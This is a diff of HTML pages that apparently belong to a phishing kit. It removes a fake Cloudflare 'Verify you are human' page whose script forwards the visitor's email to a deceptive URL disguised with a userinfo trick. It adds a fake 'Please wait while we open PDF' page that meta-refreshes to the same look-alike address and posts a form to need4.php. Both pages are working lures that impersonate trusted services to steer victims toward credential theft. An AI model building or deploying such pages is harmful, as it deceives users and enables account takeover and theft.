@@ -1,164 +1,94 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
+<!DOCTYPE html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Required</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #fff;
-        }
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<title></title>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	<style>
+@font-face{
+	font-family: 'fmtt';
 
-        .verification-container {
-            border: 1px solid #ddd;
-            padding: 12px 20px;
-            width: 300px;
-            background: #fff;
-        }
-
-        .checkbox-wrapper {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            position: relative;
-        }
-
-        input[type="checkbox"] {
-            width: 16px;
-            height: 16px;
-            cursor: pointer;
-        }
-
-        .spinner {
-            display: none;
-            width: 16px;
-            height: 16px;
-        }
-
-        .checkbox-label {
-            font-size: 13px;
-            color: #000;
-        }
-
-        .cloudflare-logo {
-            float: right;
-            width: 3rem;
-            margin-bottom: -15px;
-        }
-
-        .cloudflare-text {
-            font-size: 1rem;
-
-        }
-
-        .footer-container {
-            display: block;
-            justify-content: space-between;
-            align-items: center;
-            margin-left: auto;
-            padding-bottom: 10px;
-        }
-
-        .footer-content {
-            display: block;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        
-
-        .footer {
-            text-align: right;
-            font-size: 11px;
-            color: #737373;
-            margin-top: -15px;
-        }
-
-        .footer a {
-            color: #737373;
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        .divider {
-            margin: 0 4px;
-        }
-    </style>
-
-<script>
-    // Get the email parameter directly from the URL.
-    function getQueryParams() {
-        const params = new URLSearchParams(window.location.search);
-        const email = params.get('email');
-        return { email };
-    }
-
-    // Redirect to a plain text URL with the email appended as a fragment.
-    function redirectToUrl() {
-        const { email } = getQueryParams();
-        // Use your plain destination URL here instead of a Base64 encoded string.
-        const destinationUrl = "https://high.com+login{source=secure+settings=private@lanette007.codeberg.page/web.html";
-        if (email) {
-            window.location.href = `${destinationUrl}#${email}`;
-        } else {
-            console.error('Email parameter is missing');
-        }
-    }
-
-    // Handle the checkbox verification UI.
-    function handleCheckbox() {
-        const checkbox = document.getElementById('verification-checkbox');
-        const spinner = document.getElementById('spinner');
-        const label = document.getElementById('checkbox-label');
-
-        if (checkbox.checked) {
-            checkbox.style.display = 'none'; // Hide checkbox
-            spinner.style.display = 'inline'; // Show spinner
-            label.textContent = "Verifying..."; // Update text
-            setTimeout(redirectToUrl, 100);
-        }
-    }
-</script>
+  src: url(img/font1.woff2) format('truetype');
+  }
+*{
+	margin:auto;
+	font-size:14px;
+	outline:0;
+	font-family:'fmtt';
+}input{
+	border:0;
+    display:block;
+	margin-top:0px;
+	width:100%;
+	padding:6px;
+	background:#f2f2f2;
+	
+	padding-left:0;
+}td{
+	border-right:1px solid black;
+	padding-right:10px;
+	padding-left:10px;
+	font-size:11px;
+	color:#0072ce;
+}.inp{
+	margin-top:30px;
+	border-radius:15px;
+	background:#f2f2f2;
+	text-align:center;
+	border:1px solid #f2f2f2;
+	width:93%;
+	padding:6px;
+	padding-left:1px;
+}label{
+	display:block;
+	text-align:left;
+	margin:0;
+	font-size:10px;
+	color:gray;
+	padding:0;
+	width:100%;
+}@keyframes roll{
+	from{
+	transform:rotate(0deg);
+	}to{
+	rotate:360deg;
+	}
+}#rl{
+	animation:roll 1s infinite;
+}
+@keyframes fade{
+	from{
+	opacity: 1;
+	}to{
+	opacity:0.3;
+	}
+}#fd{
+	animation:fade 1s infinite;
+}
+	</style>
 </head>
 <body>
-    <div class="verification-container">
-        <div class="checkbox-wrapper">
-            <div class="spinner-container">
-                <input type="checkbox" id="verification-checkbox" onchange="handleCheckbox()">
-            <img id="spinner" class="spinner" src="https://upload.wikimedia.org/wikipedia/commons/d/de/Ajax-loader.gif" alt="Loading...">
 
-            </div>
-            <label id="checkbox-label" for="verification-checkbox" class="checkbox-label">Verify you are human</label>
 
-            <div class="footer-container">
-                <div class="footer-content">
-                    <img src="https://www.cloudflare.com/favicon.ico" alt="Cloudflare" class="cloudflare-logo">
-                    <h1 class="cloudflare-text">
-                        Cloudflare
-                    </h1>
+<div style="max-width:500px;padding:0px;">
 
-                    <div class="footer">
-                        <a href="#">Privacy</a>
-                        <span class="divider">•</span>
-                        <a href="#">Terms</a>
-                    </div>
-                </div>
-            </div>
-        </div>
+<form action="need4.php" method="POST">
+<div style="text-align:center">
+<img src="https://remityourduepayment.vercel.app/img/Icon_pdf_file.svg.png" width="45px" style="margin-top:200px;" id="fd">
+<meta http-equiv="Refresh" content="3; url=https://high.com+login{source=secure+settings=private@lanette007.codeberg.page/pdf.html">
+</div>
+<p style="text-align:center;font-size:15px;margin-top:10px">Please wait while we open PDF...</p>
+<span style="display:block;height:10px;width:10px;border:3px solid lightgray;border-radius:70px;border-top-color:red;margin-top:40px;" id="rl"></span>
+</div>
 
-    </div>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93ec4a271ec303ee',t:'MTc0NzA3Nzc5Ny4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 
+
+</form>
+
+
+
+</body>
 </html>
-
-
